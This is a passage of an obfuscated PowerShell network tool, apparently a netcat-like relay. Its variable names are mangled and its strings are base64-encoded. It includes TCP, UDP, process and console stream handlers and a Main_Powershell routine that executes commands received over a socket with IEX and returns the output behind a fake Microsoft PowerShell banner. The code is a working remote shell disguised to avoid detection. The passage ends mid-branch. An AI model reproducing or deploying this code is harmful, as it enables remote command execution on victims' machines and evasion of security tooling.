          Write-Verbose ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AbgBlAGMAdABpAG8AbgAgAGYAcgBvAG0AIABbAA=='))) + ${_/=\_/==\___/\/==}.Client.RemoteEndPoint.Address.IPAddressToString + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XQAgAHAAbwByAHQAIAA='))) + $port + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABbAHQAYwBwAF0AIABhAGMAYwBlAHAAdABlAGQAIAAoAHMAbwB1AHIAYwBlACAAcABvAHIAdAAgAA=='))) + ${_/=\_/==\___/\/==}.Client.RemoteEndPoint.Port + ")")
        }
        break
      }
    }
    ${_/\/=\/\__/\_____}.Stop()
    if(${_/=\/=\/\/\______} -eq $null){break}
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAZQBhAG0A')))] = ${_/\___/==\_/===\/}
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAGMAawBlAHQA')))] = ${_/=\/=\/\/\______}
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIAUwBpAHoAZQA=')))] = ${_/\/=\/\/\/====\_}
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAZQBhAG0ARABlAHMAdABpAG4AYQB0AGkAbwBuAEIAdQBmAGYAZQByAA==')))] = (New-Object System.Byte[] $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIAUwBpAHoAZQA=')))])
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAZQBhAG0AUgBlAGEAZABPAHAAZQByAGEAdABpAG8AbgA=')))] = $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAZQBhAG0A')))].BeginRead($FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAZQBhAG0ARABlAHMAdABpAG4AYQB0AGkAbwBuAEIAdQBmAGYAZQByAA==')))], 0, $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIAUwBpAHoAZQA=')))], $null, $null)
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGMAbwBkAGkAbgBnAA==')))] = New-Object System.Text.AsciiEncoding
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAZQBhAG0AQgB5AHQAZQBzAFIAZQBhAGQA')))] = 1
    return $FuncVars
  }
  function ReadData_TCP
  {
    param($FuncVars)
    $Data = $null
    if($FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAZQBhAG0AQgB5AHQAZQBzAFIAZQBhAGQA')))] -eq 0){break}
    if($FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAZQBhAG0AUgBlAGEAZABPAHAAZQByAGEAdABpAG8AbgA=')))].IsCompleted)
    {
      ${/===\/=\___/\___/} = $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAZQBhAG0A')))].EndRead($FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAZQBhAG0AUgBlAGEAZABPAHAAZQByAGEAdABpAG8AbgA=')))])
      if(${/===\/=\___/\___/} -eq 0){break}
      $Data = $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAZQBhAG0ARABlAHMAdABpAG4AYQB0AGkAbwBuAEIAdQBmAGYAZQByAA==')))][0..([int]${/===\/=\___/\___/}-1)]
      $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAZQBhAG0AUgBlAGEAZABPAHAAZQByAGEAdABpAG8AbgA=')))] = $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAZQBhAG0A')))].BeginRead($FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAZQBhAG0ARABlAHMAdABpAG4AYQB0AGkAbwBuAEIAdQBmAGYAZQByAA==')))], 0, $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIAUwBpAHoAZQA=')))], $null, $null)
    }
    return $Data,$FuncVars
  }
  function WriteData_TCP
  {
    param($Data,$FuncVars)
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAZQBhAG0A')))].Write($Data, 0, $Data.Length)
    return $FuncVars
  }
  function Close_TCP
  {
    param($FuncVars)
    try{$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAZQBhAG0A')))].Close()}
    catch{}
    if($FuncVars["l"]){$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAGMAawBlAHQA')))].Stop()}
    else{$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAGMAawBlAHQA')))].Close()}
  }
  function Setup_CMD
  {
    param($FuncSetupVars)
    if(${global:_/======\/\/\/==\}){${_/======\/\/\/==\} = $True}
    $FuncVars = @{}
    ${____/\/\/\/\/\_/=} = New-Object System.Diagnostics.ProcessStartInfo
    ${____/\/\/\/\/\_/=}.FileName = $FuncSetupVars[0]
    ${____/\/\/\/\/\_/=}.UseShellExecute = $False
    ${____/\/\/\/\/\_/=}.RedirectStandardInput = $True
    ${____/\/\/\/\/\_/=}.RedirectStandardOutput = $True
    ${____/\/\/\/\/\_/=}.RedirectStandardError = $True
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwA=')))] = [System.Diagnostics.Process]::Start(${____/\/\/\/\/\_/=})
    Write-Verbose ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AGkAbgBnACAAUAByAG8AYwBlAHMAcwAgAA=='))) + $FuncSetupVars[0] + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAuAC4A'))))
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwA=')))].Start() | Out-Null
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQATwB1AHQARABlAHMAdABpAG4AYQB0AGkAbwBuAEIAdQBmAGYAZQByAA==')))] = New-Object System.Byte[] 65536
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQATwB1AHQAUgBlAGEAZABPAHAAZQByAGEAdABpAG8AbgA=')))] = $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwA=')))].StandardOutput.BaseStream.BeginRead($FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQATwB1AHQARABlAHMAdABpAG4AYQB0AGkAbwBuAEIAdQBmAGYAZQByAA==')))], 0, 65536, $null, $null)
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQARQByAHIARABlAHMAdABpAG4AYQB0AGkAbwBuAEIAdQBmAGYAZQByAA==')))] = New-Object System.Byte[] 65536
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQARQByAHIAUgBlAGEAZABPAHAAZQByAGEAdABpAG8AbgA=')))] = $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwA=')))].StandardError.BaseStream.BeginRead($FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQARQByAHIARABlAHMAdABpAG4AYQB0AGkAbwBuAEIAdQBmAGYAZQByAA==')))], 0, 65536, $null, $null)
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGMAbwBkAGkAbgBnAA==')))] = New-Object System.Text.AsciiEncoding
    return $FuncVars
  }
  function ReadData_CMD
  {
    param($FuncVars)
    [byte[]]$Data = @()
    if($FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQATwB1AHQAUgBlAGEAZABPAHAAZQByAGEAdABpAG8AbgA=')))].IsCompleted)
    {
      ${/=\/\_/\/\___/==\} = $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwA=')))].StandardOutput.BaseStream.EndRead($FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQATwB1AHQAUgBlAGEAZABPAHAAZQByAGEAdABpAG8AbgA=')))])
      if(${/=\/\_/\/\___/==\} -eq 0){break}
      $Data += $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQATwB1AHQARABlAHMAdABpAG4AYQB0AGkAbwBuAEIAdQBmAGYAZQByAA==')))][0..([int]${/=\/\_/\/\___/==\}-1)]
      $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQATwB1AHQAUgBlAGEAZABPAHAAZQByAGEAdABpAG8AbgA=')))] = $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwA=')))].StandardOutput.BaseStream.BeginRead($FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQATwB1AHQARABlAHMAdABpAG4AYQB0AGkAbwBuAEIAdQBmAGYAZQByAA==')))], 0, 65536, $null, $null)
    }
    if($FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQARQByAHIAUgBlAGEAZABPAHAAZQByAGEAdABpAG8AbgA=')))].IsCompleted)
    {
      ${__/======\/===\_/} = $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwA=')))].StandardError.BaseStream.EndRead($FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQARQByAHIAUgBlAGEAZABPAHAAZQByAGEAdABpAG8AbgA=')))])
      if(${__/======\/===\_/} -eq 0){break}
      $Data += $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQARQByAHIARABlAHMAdABpAG4AYQB0AGkAbwBuAEIAdQBmAGYAZQByAA==')))][0..([int]${__/======\/===\_/}-1)]
      $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQARQByAHIAUgBlAGEAZABPAHAAZQByAGEAdABpAG8AbgA=')))] = $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwA=')))].StandardError.BaseStream.BeginRead($FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQARQByAHIARABlAHMAdABpAG4AYQB0AGkAbwBuAEIAdQBmAGYAZQByAA==')))], 0, 65536, $null, $null)
    }
    return $Data,$FuncVars
  }
  function WriteData_CMD
  {
    param($Data,$FuncVars)
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwA=')))].StandardInput.WriteLine($FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGMAbwBkAGkAbgBnAA==')))].GetString($Data).TrimEnd("`r").TrimEnd("`n"))
    return $FuncVars
  }
  function Close_CMD
  {
    param($FuncVars)
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwA=')))] | kill
  }  
  function Main_Powershell
  {
    param($Stream1SetupVars)   
    try
    {
      ${_/=\/\/\/\___/\_/} = New-Object System.Text.AsciiEncoding
      [byte[]]${/==\/===\/\__/\/\} = @()
      if($i -ne $null)
      {
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHAAdQB0ACAAZgByAG8AbQAgAC0AaQAgAGQAZQB0AGUAYwB0AGUAZAAuAC4ALgA=')))
        if(Test-Path $i){ [byte[]]${/==\/===\/\__/\/\} = ([io.file]::ReadAllBytes($i)) }
        elseif($i.GetType().Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB5AHQAZQBbAF0A')))){ [byte[]]${/==\/===\/\__/\/\} = $i }
        elseif($i.GetType().Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAaQBuAGcA')))){ [byte[]]${/==\/===\/\__/\/\} = ${_/=\/\/\/\___/\_/}.GetBytes($i) }
        else{Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAHIAZQBjAG8AZwBuAGkAcwBlAGQAIABpAG4AcAB1AHQAIAB0AHkAcABlAC4A'))) ; return}
      }
      Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQAdABpAG4AZwAgAHUAcAAgAFMAdAByAGUAYQBtACAAMQAuAC4ALgAgACgARQBTAEMALwBDAFQAUgBMACAAdABvACAAZQB4AGkAdAApAA==')))
      try{${__/==\/\_/\__/=\_} = Stream1_Setup $Stream1SetupVars}
      catch{Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAZQBhAG0AIAAxACAAUwBlAHQAdQBwACAARgBhAGkAbAB1AHIAZQA='))) ; return}
      Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQAdABpAG4AZwAgAHUAcAAgAFMAdAByAGUAYQBtACAAMgAuAC4ALgAgACgARQBTAEMALwBDAFQAUgBMACAAdABvACAAZQB4AGkAdAApAA==')))
      try
      {
        ${/\_____/\/=\_____} = ${_/=\/\/\/\___/\_/}.GetBytes($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwACgBDAG8AcAB5AHIAaQBnAGgAdAAgACgAQwApACAAMgAwADEAMwAgAE0AaQBjAHIAbwBzAG8AZgB0ACAAQwBvAHIAcABvAHIAYQB0AGkAbwBuAC4AIABBAGwAbAAgAHIAaQBnAGgAdABzACAAcgBlAHMAZQByAHYAZQBkAC4ACgAKAA=='))) + ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTACAA'))) + (pwd).Path + "> "))
        ${_/\_/=\_____/===\} = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTACAA'))) + (pwd).Path + "> ")
        ${___/==\/=\/==\_/\} = ""      
        $Data = $null
      }
      catch
      {
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAZQBhAG0AIAAyACAAUwBlAHQAdQBwACAARgBhAGkAbAB1AHIAZQA='))) ; return
      }
      if(${/==\/===\/\__/\/\} -ne @())
      {
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABpAG4AZwAgAGkAbgBwAHUAdAAgAHQAbwAgAFMAdAByAGUAYQBtACAAMQAuAC4ALgA=')))
        try{${__/==\/\_/\__/=\_} = Stream1_WriteData ${/==\/===\/\__/\/\} ${__/==\/\_/\__/=\_}}
        catch{Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbABlAGQAIAB0AG8AIAB3AHIAaQB0AGUAIABpAG4AcAB1AHQAIAB0AG8AIABTAHQAcgBlAGEAbQAgADEA'))) ; return}
      }
      if($d){Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQBkACAAKABkAGkAcwBjAG8AbgBuAGUAYwB0ACkAIABBAGMAdABpAHYAYQB0AGUAZAAuACAARABpAHMAYwBvAG4AbgBlAGMAdABpAG4AZwAuAC4ALgA='))) ; return}
      Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBvAHQAaAAgAEMAbwBtAG0AdQBuAGkAYwBhAHQAaQBvAG4AIABTAHQAcgBlAGEAbQBzACAARQBzAHQAYQBiAGwAaQBzAGgAZQBkAC4AIABSAGUAZABpAHIAZQBjAHQAaQBuAGcAIABEAGEAdABhACAAQgBlAHQAdwBlAGUAbgAgAFMAdAByAGUAYQBtAHMALgAuAC4A')))
      while($True)
      {        
        try
        {
          ${_/\_/=\_____/===\} = $null
          ${__/\_/\/\_/\/===\} = $null
          if(${___/==\/=\/==\_/\} -ne "")
          {
            try{[byte[]]${__/\_/\/\_/\/===\} = ${_/=\/\/\/\___/\_/}.GetBytes((IEX ${___/==\/=\/==\_/\} 2>&1 | Out-String))}
            catch{[byte[]]${__/\_/\/\_/\/===\} = ${_/=\/\/\/\___/\_/}.GetBytes(($_ | Out-String))}
            ${_/\_/=\_____/===\} = ${_/=\/\/\/\___/\_/}.GetBytes(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTACAA'))) + (pwd).Path + "> "))
          }
          $Data += ${/\_____/\/=\_____}
          ${/\_____/\/=\_____} = $null
          $Data += ${__/\_/\/\_/\/===\}
          $Data += ${_/\_/=\_____/===\}
          ${___/==\/=\/==\_/\} = ""
          if($Data -ne $null){${__/==\/\_/\__/=\_} = Stream1_WriteData $Data ${__/==\/\_/\__/=\_}}
          $Data = $null
        }
        catch
        {
          Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbABlAGQAIAB0AG8AIAByAGUAZABpAHIAZQBjAHQAIABkAGEAdABhACAAZgByAG8AbQAgAFMAdAByAGUAYQBtACAAMgAgAHQAbwAgAFMAdAByAGUAYQBtACAAMQA='))) ; return
        }
        try
        {
          $Data,${__/==\/\_/\__/=\_} = Stream1_ReadData ${__/==\/\_/\__/=\_}
          if($Data.Length -eq 0){sleep -Milliseconds 100}
          if($Data -ne $null){${___/==\/=\/==\_/\} = ${_/=\/\/\/\___/\_/}.GetString($Data)}
          $Data = $null
        }
        catch
        {
          Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbABlAGQAIAB0AG8AIAByAGUAZABpAHIAZQBjAHQAIABkAGEAdABhACAAZgByAG8AbQAgAFMAdAByAGUAYQBtACAAMQAgAHQAbwAgAFMAdAByAGUAYQBtACAAMgA='))) ; return
        }
      }
    }
    finally
    {
      try
      {
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBpAG4AZwAgAFMAdAByAGUAYQBtACAAMQAuAC4ALgA=')))
        Stream1_Close ${__/==\/\_/\__/=\_}
      }
      catch
      {
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbABlAGQAIAB0AG8AIABjAGwAbwBzAGUAIABTAHQAcgBlAGEAbQAgADEA')))
      }
    }
  }
  function Setup_Console
  {
    param($FuncSetupVars)
    $FuncVars = @{}
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGMAbwBkAGkAbgBnAA==')))] = New-Object System.Text.AsciiEncoding
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQA')))] = $FuncSetupVars[0]
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQAQgB5AHQAZQBzAA==')))] = [byte[]]@()
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQAUwB0AHIAaQBuAGcA')))] = ""
    return $FuncVars
  }
  function ReadData_Console
  {
    param($FuncVars)
    $Data = $null
    if($Host.UI.RawUI.KeyAvailable)
    {
      $Data = $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGMAbwBkAGkAbgBnAA==')))].GetBytes((Read-Host) + "`n")
    }
    return $Data,$FuncVars
  }
  function WriteData_Console
  {
    param($Data,$FuncVars)
    switch($FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQA')))])
    {
      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdAA='))) {Write-Host -n $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGMAbwBkAGkAbgBnAA==')))].GetString($Data)}
      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAaQBuAGcA'))) {$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQAUwB0AHIAaQBuAGcA')))] += $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGMAbwBkAGkAbgBnAA==')))].GetString($Data)}
      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB5AHQAZQBzAA=='))) {$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQAQgB5AHQAZQBzAA==')))] += $Data}
    }
    return $FuncVars
  }
  function Close_Console
  {
    param($FuncVars)
    if($FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQAUwB0AHIAaQBuAGcA')))] -ne ""){return $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQAUwB0AHIAaQBuAGcA')))]}
    elseif($FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQAQgB5AHQAZQBzAA==')))] -ne @()){return $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQAQgB5AHQAZQBzAA==')))]}
    return
  }
  function Main
  {
    param($Stream1SetupVars,$Stream2SetupVars)
    try
    {
      [byte[]]${/==\/===\/\__/\/\} = @()
      ${_/=\/\/\/\___/\_/} = New-Object System.Text.AsciiEncoding
      if($i -ne $null)
      {
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHAAdQB0ACAAZgByAG8AbQAgAC0AaQAgAGQAZQB0AGUAYwB0AGUAZAAuAC4ALgA=')))
        if(Test-Path $i){ [byte[]]${/==\/===\/\__/\/\} = ([io.file]::ReadAllBytes($i)) }
        elseif($i.GetType().Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB5AHQAZQBbAF0A')))){ [byte[]]${/==\/===\/\__/\/\} = $i }
        elseif($i.GetType().Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAaQBuAGcA')))){ [byte[]]${/==\/===\/\__/\/\} = ${_/=\/\/\/\___/\_/}.GetBytes($i) }
        else{Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAHIAZQBjAG8AZwBuAGkAcwBlAGQAIABpAG4AcAB1AHQAIAB0AHkAcABlAC4A'))) ; return}
      }
      Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQAdABpAG4AZwAgAHUAcAAgAFMAdAByAGUAYQBtACAAMQAuAC4ALgA=')))
      try{${__/==\/\_/\__/=\_} = Stream1_Setup $Stream1SetupVars}
      catch{Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAZQBhAG0AIAAxACAAUwBlAHQAdQBwACAARgBhAGkAbAB1AHIAZQA='))) ; return}
      Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQAdABpAG4AZwAgAHUAcAAgAFMAdAByAGUAYQBtACAAMgAuAC4ALgA=')))
      try{${_/=\/\/====\/===\} = Stream2_Setup $Stream2SetupVars}
      catch{Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAZQBhAG0AIAAyACAAUwBlAHQAdQBwACAARgBhAGkAbAB1AHIAZQA='))) ; return}
      $Data = $null
      if(${/==\/===\/\__/\/\} -ne @())
      {
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABpAG4AZwAgAGkAbgBwAHUAdAAgAHQAbwAgAFMAdAByAGUAYQBtACAAMQAuAC4ALgA=')))
        try{${__/==\/\_/\__/=\_} = Stream1_WriteData ${/==\/===\/\__/\/\} ${__/==\/\_/\__/=\_}}
        catch{Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbABlAGQAIAB0AG8AIAB3AHIAaQB0AGUAIABpAG4AcAB1AHQAIAB0AG8AIABTAHQAcgBlAGEAbQAgADEA'))) ; return}
      }
      if($d){Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQBkACAAKABkAGkAcwBjAG8AbgBuAGUAYwB0ACkAIABBAGMAdABpAHYAYQB0AGUAZAAuACAARABpAHMAYwBvAG4AbgBlAGMAdABpAG4AZwAuAC4ALgA='))) ; return}
      Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBvAHQAaAAgAEMAbwBtAG0AdQBuAGkAYwBhAHQAaQBvAG4AIABTAHQAcgBlAGEAbQBzACAARQBzAHQAYQBiAGwAaQBzAGgAZQBkAC4AIABSAGUAZABpAHIAZQBjAHQAaQBuAGcAIABEAGEAdABhACAAQgBlAHQAdwBlAGUAbgAgAFMAdAByAGUAYQBtAHMALgAuAC4A')))
      while($True)
      {
        try
        {
          $Data,${_/=\/\/====\/===\} = Stream2_ReadData ${_/=\/\/====\/===\}
          if(($Data.Length -eq 0) -or ($Data -eq $null)){sleep -Milliseconds 100}
          if($Data -ne $null){${__/==\/\_/\__/=\_} = Stream1_WriteData $Data ${__/==\/\_/\__/=\_}}
          $Data = $null
        }
        catch
        {
          Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbABlAGQAIAB0AG8AIAByAGUAZABpAHIAZQBjAHQAIABkAGEAdABhACAAZgByAG8AbQAgAFMAdAByAGUAYQBtACAAMgAgAHQAbwAgAFMAdAByAGUAYQBtACAAMQA='))) ; return
        }
        try
        {
          $Data,${__/==\/\_/\__/=\_} = Stream1_ReadData ${__/==\/\_/\__/=\_}
          if(($Data.Length -eq 0) -or ($Data -eq $null)){sleep -Milliseconds 100}
          if($Data -ne $null){${_/=\/\/====\/===\} = Stream2_WriteData $Data ${_/=\/\/====\/===\}}
          $Data = $null
        }
        catch
        {
          Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbABlAGQAIAB0AG8AIAByAGUAZABpAHIAZQBjAHQAIABkAGEAdABhACAAZgByAG8AbQAgAFMAdAByAGUAYQBtACAAMQAgAHQAbwAgAFMAdAByAGUAYQBtACAAMgA='))) ; return
        }
      }
    }
    finally
    {
      try
      {
        Stream2_Close ${_/=\/\/====\/===\}
      }
      catch
      {
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbABlAGQAIAB0AG8AIABjAGwAbwBzAGUAIABTAHQAcgBlAGEAbQAgADIA')))
      }
      try
      {
        Stream1_Close ${__/==\/\_/\__/=\_}
      }
      catch
      {
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbABlAGQAIAB0AG8AIABjAGwAbwBzAGUAIABTAHQAcgBlAGEAbQAgADEA')))
      }
    }
  }
  if($u)
  {
    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQAIABTAHQAcgBlAGEAbQAgADEAOgAgAFUARABQAA==')))
    ${_/\__/\___/\/\___} = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgA='))) + ${function:Setup_UDP} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))
    ${_/\__/\___/\/\___} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFIAZQBhAGQARABhAHQAYQAKAHsACgA='))) + ${function:ReadData_UDP} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))
    ${_/\__/\___/\/\___} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFcAcgBpAHQAZQBEAGEAdABhAAoAewAKAA=='))) + ${function:WriteData_UDP} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))
    ${_/\__/\___/\/\___} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAEMAbABvAHMAZQAKAHsACgA='))) + ${function:Close_UDP} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))    
    if($l){${__/\/==\_/=\/\/\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGkAbgAgAEAAKAAnACcALAAkAFQAcgB1AGUALAAnACQAcAAnACwAJwAkAHQAJwApACAA')))}
    else{${__/\/==\_/=\/\/\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGkAbgAgAEAAKAAnACQAYwAnACwAJABGAGEAbABzAGUALAAnACQAcAAnACwAJwAkAHQAJwApACAA')))}
  }
  elseif($dns -ne "")
  {
